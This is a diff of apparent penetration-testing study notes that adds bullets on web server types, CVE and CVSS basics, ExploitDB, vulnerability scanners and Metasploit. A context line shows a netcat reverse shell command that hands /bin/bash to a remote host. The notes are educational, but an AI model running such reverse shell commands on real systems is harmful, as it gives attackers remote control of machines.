@@ -16,4 +16,23 @@
 	- netcat 192.168.1.1 2222 -e /bin/bash
 - payload (revshells.com)
 
-- 
+- web server (whatweb http://google.com)
+	- Apache server (sudo systemctl start apache2)
+	- Nginx Server (sudo systemctl status nginx          sudo systemctl status nginx )
+	- Python Server (python3 -m http.server 9090)
+	- Microsoft IIS
+	- Ruby on Rails
+	- LiteSpeed
+___
+
+- CVE (Common Vulnerabilities and Exposures)
+	- Common Vulnerability Scoring System (CVSS)  (0.0-10.0)
+	- MITRE Corporation -----     MITRE ATT&CK Framework:
+	- CVE-YEAR-ID  (CVE-2019-22321)
+- ExploitDB  (offsec)     [https://exploit-db.com]     [CVE - Search CVE List (mitre.org)](https://cve.mitre.org/cve/search_cve_list.html)     SearchSploit
+- Common Vulnerability Assessment Tools
+	- Nessus   (https://www.tenable.com/products/nessus)
+	- Acunetix
+	- OpenVAS
+	- Nmap with NSE
+- Metasploit
